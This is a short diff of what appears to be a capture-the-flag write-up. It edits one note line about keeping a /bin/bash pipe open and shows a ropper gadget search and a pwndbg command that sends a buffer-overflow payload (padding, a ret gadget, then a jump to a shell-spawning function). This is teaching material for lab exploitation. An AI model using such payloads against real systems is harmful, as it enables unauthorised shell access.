@@ -66,7 +66,7 @@ ropper --file get_it --search "ret"
 
 Add it in front of the payload to **pop** the misaligned bytes, and return to the `system` function that gives us a shell. 
 
-	Note, you need something at the end like the ))')q for the `/bin/bash` pipe to stay open and accept a command.
+Note: you need something at the end like the q `))')q` for the `/bin/bash` pipe to stay open and accept a command.
 
 ```
 pwndbg> run < <(python3 -c 'import sys,pwn;sys.stdout.buffer.write(b"A"*40 + pwn.p64(0x400451) + pwn.p64(0x4005b6))')q
